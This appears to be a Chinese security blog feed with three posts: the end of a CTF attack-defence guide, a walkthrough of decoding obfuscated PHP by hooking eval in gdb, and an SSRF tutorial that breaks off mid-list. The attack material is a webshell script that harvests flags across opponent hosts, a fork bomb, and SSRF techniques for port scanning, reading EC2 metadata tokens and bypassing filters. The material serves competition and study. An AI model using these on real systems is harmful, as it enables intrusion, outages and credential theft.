sys.exit()</div><div class="line">    host = server_host</div><div class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">3</span>:</div><div class="line">        host = sys.argv[<span class="number">3</span>]</div><div class="line">    <span class="keyword">print</span> json.dumps(submit(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], host=host), indent=<span class="number">4</span>)</div></pre></td></tr></table></figure><p>7.批量修改ssh密码的脚本(猥琐流直接干掉几个对手)</p><p>8.如果有发现有预留后门，要立即使用脚本进行获取flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line">url=<span class="string">"http://192.168.71."</span></div><div class="line">url1=<span class="string">""</span></div><div class="line">shell=<span class="string">"/Upload/index.php"</span></div><div class="line">passwd=<span class="string">"abcde10db05bd4f6a24c94d7edde441d18545"</span> </div><div class="line">port=<span class="string">"80"</span></div><div class="line">payload = &#123;passwd: <span class="string">'system(\'cat /flag\');'</span>&#125;</div><div class="line">f=open(<span class="string">"webshelllist.txt"</span>,<span class="string">"w"</span>) </div><div class="line">f1=open(<span class="string">"firstround_flag.txt"</span>,<span class="string">"w"</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">51</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">41</span>,<span class="number">42</span>,<span class="number">43</span>,<span class="number">71</span>,<span class="number">72</span>,<span class="number">73</span>,<span class="number">81</span>,<span class="number">82</span>,<span class="number">83</span>]: </div><div class="line">    url1=url+str(i)+<span class="string">":"</span>+port+shell</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        res=requests.post(url1,payload,timeout=<span class="number">1</span>)</div><div class="line">        <span class="keyword">if</span> res.status_code == requests.codes.ok:</div><div class="line">            <span class="keyword">print</span> url1+<span class="string">" connect shell sucess,flag is "</span>+res.text</div><div class="line">            <span class="keyword">print</span> &gt;&gt;f1,url1+<span class="string">" connect shell sucess,flag is "</span>+res.text</div><div class="line">            <span class="keyword">print</span> &gt;&gt;f,url1+<span class="string">","</span>+passwd</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">"shell 404"</span></div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">print</span> url1+<span class="string">" connect shell fail"</span></div><div class="line"></div><div class="line">f.close()</div><div class="line">f1.close()</div></pre></td></tr></table></figure><p>9.自写敏感功能。主办方可能已经把CMS本身的漏洞补全了，并自写了一些敏感功能，如上传、包含界面..，这时候需要自己手动去发现（利用seay代码审计工具可快速定位、ls -t按修改时间来看最新被修改的文件），分析，删除，利用。</p><p>10.fork炸弹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 参考: https://linux.cn/article-5685-1-rss.html</span></div><div class="line">:()&#123;:|:&amp;&#125;;:</div></pre></td></tr></table></figure><h3 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h3><ul><li><a href="https://xianzhi.aliyun.com/forum/topic/1530/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/topic/1530</a></li><li><a href="http://bobao.360.cn/ctf/learning/210.html" target="_blank" rel="external">http://bobao.360.cn/ctf/learning/210.html</a></li><li><a href="https://mp.weixin.qq.com/s/q6xwmkADGnbHJQRbPblaHg" target="_blank" rel="external">https://mp.weixin.qq.com/s/q6xwmkADGnbHJQRbPblaHg</a></li><li><a href="https://www.t00ls.net/viewthread.php?tid=34681" target="_blank" rel="external">https://www.t00ls.net/viewthread.php?tid=34681</a></li><li><a href="http://rcoil.me/2017/06/CTF" target="_blank" rel="external">http://rcoil.me/2017/06/CTF线下赛总结</a></li><li><a href="https://forum.90sec.org/forum.php?mod=viewthread&amp;tid=10560" target="_blank" rel="external">https://forum.90sec.org/forum.php?mod=viewthread&amp;tid=10560</a></li><li><a href="http://www.freebuf.com/articles/web/118149.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/118149.html</a></li><li><a href="https://www.secpulse.com/archives/38622.html" target="_blank" rel="external">https://www.secpulse.com/archives/38622.html</a></li><li><a href="http://bobao.360.cn/ctf/detail/169.html" target="_blank" rel="external">http://bobao.360.cn/ctf/detail/169.html</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>解密混淆的PHP代码</title>
      <link href="/2018/05/23/decode-garble-phpcode/"/>
      <url>/2018/05/23/decode-garble-phpcode/</url>
      <content type="html"><![CDATA[<p>###0x00 前言</p><p>被混淆PHP代码见的很多了，但以前比较懒总是用扩展直接decode掉，最近就想手动操作下看看不使用扩展怎么进行解密。</p><h3 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h3><p>一般来说PHP的混淆都会通过多次<code>eval</code>来还原并执行php代码，所以我们可以通过hook PHP的<code>eval</code>函数来打印其参数来解密代码。</p><h3 id="0x02-环境配置"><a href="#0x02-环境配置" class="headerlink" title="0x02 环境配置"></a>0x02 环境配置</h3><p>OS: ubuntu 18.04</p><p>PHP: 5.6.36</p><p>首先要安装PHP，此处安装的版本为5.6.36</p><p>1.安装相关的依赖库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo apt-get update</div><div class="line">sudo apt-get install libxml2-dev build-essential openssl libssl-dev make curl  libcurl4-gnutls-dev libjpeg-dev libpng-dev libtool-bin bison php-fpm</div></pre></td></tr></table></figure><p>2.编译安装libiconv</p><p>在<a href="http://www.gnu.org/software/libiconv/#TOCdownloading" target="_blank" rel="external">libiconv官网</a>下载压缩包，放到<code>/usr/local/src</code>下，解压，编译安装，这里下载的是<code>libiconv-1.15.tar.gz</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">sudo tar zxvf libiconv-1.15.tar.gz</div><div class="line"><span class="built_in">cd</span> libiconv-1.15</div><div class="line">sudo ./configure --prefix=/usr/<span class="built_in">local</span></div><div class="line">sudo make</div><div class="line">sudo make install</div><div class="line">sudo ldconfig // 刷新动态链接库缓存</div></pre></td></tr></table></figure><p>注意，这里是将<code>libiconv</code>安装到了系统默认的<code>lib</code>目录下，安装路径<code>/usr/local</code>不可随意更改，否则后面会出现编译错误。另外，执行<code>sudo make</code>之后会有如下warning</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">warning: remember too run &apos;libtool --finish /usr/local/lib&apos;</div></pre></td></tr></table></figure><p>按照warning的提示执行一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">libtool --finish /usr/local/lib</div></pre></td></tr></table></figure><p>3.编译安装PHP</p><p>去<a href="http://php.net/" target="_blank" rel="external">PHP官网</a>下载<code>php5.6.36</code>压缩包放到<code>/usr/local/src</code>下，解压，编译安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">sudo tar zxvf php-5.6.36.tar.gz</div><div class="line"><span class="built_in">cd</span> php-5.6.36</div><div class="line"><span class="comment">#由于我们后面要进行调试，所以要在编译时加上-g参数，加调试符号</span></div><div class="line">sudo ./configure CFLAGS=<span class="string">"-g"</span> CXXFLAGS=<span class="string">"-g"</span></div><div class="line">sudo make ZEND_EXTRA_LIBS=<span class="string">'-liconv'</span> -j16</div><div class="line">sudo make install</div></pre></td></tr></table></figure><p>4.补充下扩展的编译安装</p><p>在此处以zlib的编译安装为例，由于我们的PHP是编译安装的，所以在路径<code>php-5.6.36/ext/zlib/</code>下就有所需要的文件。如果要安装的扩展在php源码ext目录中没有，可以从<a href="http://pecl.php.net/" target="_blank" rel="external">PECL</a>上搜索你需要的扩展进行编译安装。</p><p>1.在对应的扩展目录运行<code>phpize</code>命令(如果没有提示autoconf记得apt安装)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">zeroyu@ubuntu:~/Desktop/php-5.6.36/ext/zlib$ phpize </div><div class="line">Configuring <span class="keyword">for</span>:</div><div class="line">PHP Api Version:         20131106</div><div class="line">Zend Module Api No:      20131226</div><div class="line">Zend Extension Api No:   220131226</div></pre></td></tr></table></figure><p>2.运行<code>configure</code>命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">zeroyu@ubuntu:~/Desktop/php-5.6.36/ext/zlib$ ./configure</div><div class="line">checking <span class="keyword">for</span> grep that handles long lines and -e... /bin/grep</div><div class="line">checking <span class="keyword">for</span> egrep... /bin/grep -E</div></pre></td></tr></table></figure><p>3.运行<code>make</code>命令(之后可以运行也可以不运行make test)</p><p>4.运行<code>make install</code>命令</p><p>5.配置ini文件</p><p>通过运行 <code>php --ini</code>查找php.ini文件位置，然后在文件中添加<code>extension=zlib.so</code></p><p>通过编译安装的PHP是没有php.ini文件的，但是可以通过<code>php --ini</code>查看配置文件的路径，例如:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">zeroyu@ubuntu:~/Desktop/php-5.6.36/ext/zlib$ php --ini</div><div class="line">Configuration File (php.ini) Path: /usr/<span class="built_in">local</span>/lib</div><div class="line">Loaded Configuration File:         (none)</div><div class="line">Scan <span class="keyword">for</span> additional .ini files <span class="keyword">in</span>: (none)</div><div class="line">Additional .ini files parsed:      (none)</div></pre></td></tr></table></figure><p>可以看到此时Configuration File显示的是none。这种情况你只需要将之前在PHP官网下载的PHP文件中的php.ini拷贝一份到Configuration File (php.ini) Path路径下就可以了。操作完之后再执行<code>php --ini</code>可以看到如下显示:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">zeroyu@ubuntu:~/Desktop/php-5.6.36/ext/zlib$ php --ini</div><div class="line">Configuration File (php.ini) Path: /usr/local/lib</div><div class="line">Loaded Configuration File:         /usr/local/lib/php.ini</div><div class="line">Scan for additional .ini files in: (none)</div><div class="line">Additional .ini files parsed:      (none)</div></pre></td></tr></table></figure><h3 id="0x03-开始Hook"><a href="#0x03-开始Hook" class="headerlink" title="0x03 开始Hook"></a>0x03 开始Hook</h3><p>PHP中的eval函数在Zend里需要调用<code>zend_compile_string</code>函数，我们先看下<code>zend_compile_string</code>函数的位置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">zeroyu@ubuntu:~/Desktop/php-5.6.36/Zend$ grep -rn <span class="string">"zend_compile_string"</span> *</div><div class="line">Binary file zend_alloc.o matches</div><div class="line">Binary file zend_API.o matches</div><div class="line">Binary file zend_ast.o matches</div><div class="line">Binary file zend_builtin_functions.o matches</div><div class="line">zend.c:693:zend_compile_string = compile_string;</div><div class="line">Binary file zend_closures.o matches</div><div class="line">zend_compile.c:98:ZEND_API zend_op_array *(*zend_compile_string)(zval *source_string, char *filename TSRMLS_DC);</div></pre></td></tr></table></figure><p>我们发现<code>zend_compile_string</code>函数其实就是<code>compile_string</code>函数。所以我在这儿测试一个前几天偶然间得到的被混淆的PHP代码，如下所示可以看到在<code>compile_string</code>中已经获取到<code>eval</code>参数的值。</p><p>我们可以看到程序断下来后，<code>compile_string</code>的第一个参数<code>source_string</code>为php代码中<code>eval</code>函数的参数在Zend中的结构——即<code>zval_struct</code>。<code>source_string.value.str.val</code>即为参数的字符串形式。所以之后修改修改<code>compile_string</code>函数来打印<code>eval</code>的参数就可以得到解密后的代码了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line">zeroyu@ubuntu:~/Desktop$ gdb php</div><div class="line">gdb-peda$ <span class="built_in">set</span> args a.php </div><div class="line">gdb-peda$ b compile_string</div><div class="line">Breakpoint 1 at 0x46e73f: file Zend/zend_language_scanner.l, line 716.</div><div class="line">gdb-peda$ r</div><div class="line">Starting program: /usr/<span class="built_in">local</span>/bin/php a.php </div><div class="line">[Thread debugging using libthread_db enabled]</div><div class="line">Using host libthread_db library <span class="string">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span>.</div><div class="line"></div><div class="line">[----------------------------------registers-----------------------------------]</div><div class="line">RAX: 0x5555559c2726 (&lt;compile_string&gt;:push   rbp)</div><div class="line">RBX: 0x555555a68767 (&lt;execute_ex&gt;:push   rbp)</div><div class="line">RCX: 0x7ffff7e10e48 (<span class="string">"/home/zeroyu/Desktop/a.php(1) : assert code"</span>)</div><div class="line">RDX: 0x7fffffffa030 --&gt; 0x7ffff7fd22d0 (<span class="string">"return $\307\365㣋\217= eval(base64_decode($\240\202\206\345\215\331ׁ\307));;"</span>)</div><div class="line">RSI: 0x7ffff7e10e48 (<span class="string">"/home/zeroyu/Desktop/a.php(1) : assert code"</span>)</div><div class="line">RDI: 0x7fffffffa030 --&gt; 0x7ffff7fd22d0 (<span class="string">"return $\307\365㣋\217= eval(base64_decode($\240\202\206\345\215\331ׁ\307));;"</span>)</div><div class="line">RBP: 0x7fffffff9fa0 --&gt; 0x7fffffffa120 --&gt; 0x7fffffffa270 --&gt; 0x7fffffffa420 --&gt; 0x7fffffffa440 --&gt; 0x7fffffffa560 (--&gt; ...)</div><div class="line">RSP: 0x7fffffff9e80 --&gt; 0x7ffff7e10e48 (<span class="string">"/home/zeroyu/Desktop/a.php(1) : assert code"</span>)</div><div class="line">RIP: 0x5555559c273f (&lt;compile_string+25&gt;:mov    rax,QWORD PTR fs:0x28)</div><div class="line">R8 : 0x7fffffff96c0 --&gt; 0xb (<span class="string">'\x0b'</span>)</div><div class="line">R9 : 0x555555f2<span class="built_in">cd</span>22 (<span class="string">"assert code"</span>)</div><div class="line">R10: 0x7 </div><div class="line">R11: 0xa (<span class="string">'\n'</span>)</div><div class="line">R12: 0x555555623210 (&lt;_start&gt;:xor    ebp,ebp)</div><div class="line">R13: 0x7fffffffdfb0 --&gt; 0x2 </div><div class="line">R14: 0x0 </div><div class="line">R15: 0x0</div><div class="line">EFLAGS: 0x202 (carry parity adjust zero sign <span class="built_in">trap</span> INTERRUPT direction overflow)</div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x5555559c272a &lt;compile_string+4&gt;:sub    rsp,0x120</div><div class="line">   0x5555559c2731 &lt;compile_string+11&gt;:mov    QWORD PTR [rbp-0x118],rdi</div><div class="line">   0x5555559c2738 &lt;compile_string+18&gt;:mov    QWORD PTR [rbp-0x120],rsi</div><div class="line">=&gt; 0x5555559c273f &lt;compile_string+25&gt;:mov    rax,QWORD PTR fs:0x28</div><div class="line">   0x5555559c2748 &lt;compile_string+34&gt;:mov    QWORD PTR [rbp-0x8],rax</div><div class="line">   0x5555559c274c &lt;compile_string+38&gt;:xor    eax,eax</div><div class="line">   0x5555559c274e &lt;compile_string+40&gt;:mov    edi,0xf8</div><div class="line">   0x5555559c2753 &lt;compile_string+45&gt;:call   0x5555559e67f3 &lt;_emalloc&gt;</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0x7fffffff9e80 --&gt; 0x7ffff7e10e48 (<span class="string">"/home/zeroyu/Desktop/a.php(1) : assert code"</span>)</div><div class="line">0008| 0x7fffffff9e88 --&gt; 0x7fffffffa030 --&gt; 0x7ffff7fd22d0 (<span class="string">"return $\307\365㣋\217= eval(base64_decode($\240\202\206\345\215\331ׁ\307));;"</span>)</div><div class="line">0016| 0x7fffffff9e90 --&gt; 0x8 </div><div class="line">0024| 0x7fffffff9e98 --&gt; 0x555556280608 --&gt; 0x0 </div><div class="line">0032| 0x7fffffff9ea0 --&gt; 0x7fffffff9ed0 --&gt; 0x7fffffff9f70 --&gt; 0x7fffffffa180 --&gt; 0x7ffff7fd6d08 --&gt; 0x3d8f8ba3e3f5c724 </div><div class="line">0040| 0x7fffffff9ea8 --&gt; 0x3d559e6d1a </div><div class="line">0048| 0x7fffffff9eb0 --&gt; 0x7fffffff9ed0 --&gt; 0x7fffffff9f70 --&gt; 0x7fffffffa180 --&gt; 0x7ffff7fd6d08 --&gt; 0x3d8f8ba3e3f5c724 </div><div class="line">0056| 0x7fffffff9eb8 --&gt; 0x5555559e6891 (&lt;_efree+78&gt;:leave)</div><div class="line">[------------------------------------------------------------------------------]</div><div class="line">Legend: code, data, rodata, value</div><div class="line"></div><div class="line">Breakpoint 1, compile_string (source_string=0x7fffffffa030, filename=0x7ffff7e10e48 <span class="string">"/home/zeroyu/Desktop/a.php(1) : assert code"</span>) at Zend/zend_language_scanner.l:716</div><div class="line">716&#123;</div><div class="line">gdb-peda$ p *source_string</div><div class="line"><span class="variable">$1</span> = &#123;</div><div class="line">  value = &#123;</div><div class="line">    lval = 0x7ffff7fd22d0, </div><div class="line">    dval = 6.953349167324743e-310, </div><div class="line">    str = &#123;</div><div class="line">      val = 0x7ffff7fd22d0 <span class="string">"return $\307\365㣋\217= eval(base64_decode($\240\202\206\345\215\331ׁ\307));;"</span>, </div><div class="line">      len = 0x31</div><div class="line">    &#125;, </div><div class="line">    ht = 0x7ffff7fd22d0, </div><div class="line">    obj = &#123;</div><div class="line">      handle = 0xf7fd22d0, </div><div class="line">      handlers = 0x31</div><div class="line">    &#125;, </div><div class="line">    ast = 0x7ffff7fd22d0</div><div class="line">  &#125;, </div><div class="line">  refcount__gc = 0xffffa060, </div><div class="line">  <span class="built_in">type</span> = 0x6, </div><div class="line">  is_ref__gc = 0x7f</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h3><p>​    混淆代码的解密就是类似于代码执行。最终还是要执行PHP代码，而执行PHP代码的方法很多，除了<code>eval</code>函数还有<code>assert</code>、<code>call_user_func</code>、<code>call_user_func_array</code>、<code>create_function</code>等。这些函数的底层也是调用了<code>zend_compile_string</code>，所以也可以利用hook <code>eval</code>来还原混淆后的加密代码。</p><p>​    这篇也就是对这个解密操作了一下记了个笔记，环境搭建还是比较繁琐的事，所以写的详细了点。了解归了解，现实中为了效率还是使用扩展比较方便，使用的扩展可以参考<a href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html" target="_blank" rel="external">P牛</a>的，或者这个<a href="http://php-security.org/2010/05/13/article-decoding-a-user-space-encoded-php-script/index.html" target="_blank" rel="external">外国老哥</a>的。如果扩展需要编译的话，方法在上面说过了，编译后不想加入php.ini的话，可以在每次用的时候执行<code>php -d extension=evalhook.so a.php</code>。</p><h3 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h3><p><a href="https://mp.weixin.qq.com/s/S2QJ2HiAqPFW2wo6aUAhCA" target="_blank" rel="external">解密混淆的PHP程序–逢魔安全实验室</a></p><p><a href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html" target="_blank" rel="external">phpjiami 数种解密方法—phithon</a></p><p><a href="http://blog.evalbug.com/2017/09/21/phpdecode_01/" target="_blank" rel="external">PHPDecode 在线解密工具—Medici.Yan</a></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>了解SSRF,这一篇就足够了</title>
      <link href="/2018/03/06/introduction-to-ssrf/"/>
      <url>/2018/03/06/introduction-to-ssrf/</url>
      <content type="html"><![CDATA[<p>###0x00 概念</p><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><p>注释：除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。</p><p>###0x01 可能出现的地方</p><p>1.社交分享功能：获取超链接的标题等内容进行显示</p><p>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p><p>3.在线翻译：给网址翻译对应网页的内容</p><p>4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p><p>5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p><p>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p><p>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p><p>8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</p><p>9.邮件系统：比如接收邮件服务器地址</p><p>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p><p>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p><p>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p><p>12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p><p>13.web钩子：寻找触发特定事件时发出http请求的服务。在大多数web钩子的功能中，终端用户可以选择他们的终端点和主机名。尝试向内部服务发送http请求。</p><p>14.PDF生成器：试着注入指向内部服务的<code>&lt;iframe&gt;,&lt;img&gt;,&lt;base&gt;</code>或者<code>&lt;script&gt;</code>元素或者CSS的<code>url()</code>函数。</p><p>15.文档解析器：尝试了解文档是如何被解析的。如果是XML文档，那就是用了PDF生成器方法。对于其他文档，检查是否存在引用外部资源的方法然后通过服务器向内部服务发送请求。</p><p>16.链接扩展: 最近<a href="https://twitter.com/BugBountyHQ/status/868242771617792000" target="_blank" rel="external">Mark Litchfield在推特扩展链接上发现了漏洞</a>，名声大涨。</p><p>17.文件上传：与常规上传文件相反，尝试发送url请求然后检查是否下载了url的内容。<a href="https://hackerone.com/reports/713" target="_blank" rel="external">例子</a></p><p>###0x02 漏洞验证</p><p>1.排除法：浏览器f12查看源代码看是否是在本地进行了请求</p><p>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="external">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a></p><p>2.dnslog等工具进行测试，看是否被访问</p><p>–可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。</p><p>3.抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址</p><p>–从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</p><p>–通过二级域名暴力猜解工具模糊猜测内网地址</p><p>4.直接返回的Banner、title、content等信息</p><p>5.留意bool型SSRF</p><p>###0x03 利用方式</p><p>####1.让服务端去访问相应的网址</p><p>####2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms</p><p>####3.可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件</p><p>####4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}）</p><p>####5.攻击内网应用程序（利用跨协议通信技术）</p><p>####6.判断内网主机是否存活：方法是访问看是否有端口开放</p><p>​    某些时候SSRF漏洞可以用作局域网内的端口扫描。这有助于理清内网的基础设施轮廓和并为下一步其他漏洞的利用做铺垫。上述这种情况通常是最简单的blind SSRF了。如果之前的脚本无法建立连接或收不到服务器响应，异常将被抛出。利用这个特征可以识别端口是否开放（连接建立）或关闭（连接失败或超时）。</p><table><thead><tr><th><strong>URL parameter</strong></th><th><strong>Response HTTP status</strong></th><th><strong>RTT</strong></th><th><strong>Conclusion</strong></th></tr></thead><tbody><tr><td><strong><a href="http://127.0.0.1:22" target="_blank" rel="external">http://127.0.0.1:22</a></strong></td><td><strong>200</strong></td><td><strong>10ms</strong></td><td><strong>Port is open</strong></td></tr><tr><td><strong><a href="http://127.0.0.1:23" target="_blank" rel="external">http://127.0.0.1:23</a></strong></td><td><strong>500</strong></td><td><strong>10ms</strong></td><td><strong>Port is closed</strong></td></tr><tr><td><strong><a href="http://10.0.0.1/" target="_blank" rel="external">http://10.0.0.1/</a></strong></td><td><strong>500</strong></td><td><strong>30010ms</strong></td><td><strong>Firewalled or unable to route traffic to server</strong></td></tr><tr><td><strong><a href="http://10.0.0.1:8080/" target="_blank" rel="external">http://10.0.0.1:8080/</a></strong></td><td><strong>500</strong></td><td><strong>10ms</strong></td><td><strong>Port is closed and traffic is routed to server</strong></td></tr></tbody></table><p>​    对于开放和关闭的端口，每个SSRF响应都不同。试着以不同的响应为基础建立一个开放、闭合端口和标志符之间的映射。上面的表格就是一个例子。</p><p>####7.DoS攻击（请求大文件，始终保持连接keep-alive always）</p><p>####8.提取EC2配置文件</p><p>越来越多的公司将部分基础设施放到亚马逊的EC2服务器上。亚马逊公开内部服务，每台EC实例都能查询主机元数据。<a href="https://xz.aliyun.com/t/    http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html" target="_blank" rel="external">这是AWS文档</a>。如果你在EC2上发现了SSRF漏洞，试着请求<em><a href="http://169.254.169.254/latest/meta-data" target="_blank" rel="external">http://169.254.169.254/latest/meta-data</a></em>。响应会提供许多有用的信息便于对基础设施有一定的了解，甚至可能会泄漏亚马逊S3的访问token，API token等等。你也可以下载<em> [<a href="http://169.254.169.254/latest/user-data" target="_blank" rel="external">http://169.254.169.254/latest/user-data</a></em>和解压数据。](<a href="http://169.254.169.254/latest/user-data_%E5%92%8C%E8%A7%A3%E5%8E%8B%E6%95%B0%E6%8D%AE%E3%80%82" target="_blank" rel="external">http://169.254.169.254/latest/user-data_%E5%92%8C%E8%A7%A3%E5%8E%8B%E6%95%B0%E6%8D%AE%E3%80%82</a>)</p><p>###0x04 绕过小技巧</p><p>注：参考[8]会有更详细的绕过方式总结</p><p>1.<a href="http://baidu.com@www.baidu.com/与http://www.baidu.com/请求时是相同的" target="_blank" rel="external">http://baidu.com@www.baidu.com/与http://www.baidu.com/请求时是相同的</a></p><p>2.各种IP地址的进制转换</p><p>3.URL跳转绕过：<a href="http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/" target="_blank" rel="external">http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/</a></p><p>4.短网址绕过 <a href="http://t.cn/RwbLKDx" target="_blank" rel="external">http://t.cn/RwbLKDx</a></p><p>5.xip.io来绕过：<a href="http://xxx.192.168.0.1.xip.io/" target="_blank" rel="external">http://xxx.192.168.0.1.xip.io/</a> == 192.168.0.1  (xxx 任意）</p><p>指向任意ip的域名：xip.io(37signals开发实现的定制DNS服务)</p><p>6.限制了子网段，可以加 :80 端口绕过。<a href="http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80" target="_blank" rel="external">http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80</a></p><p>7.探测内网域名，或者将自己的域名解析到内网ip</p><p>8.例如 <a href="http://10.153.138.81/ts.php" target="_blank" rel="external">http://10.153.138.81/ts.php</a> , 修复时容易出现的获取host时以/分割来确定host，</p><p>但这样可以用 <a 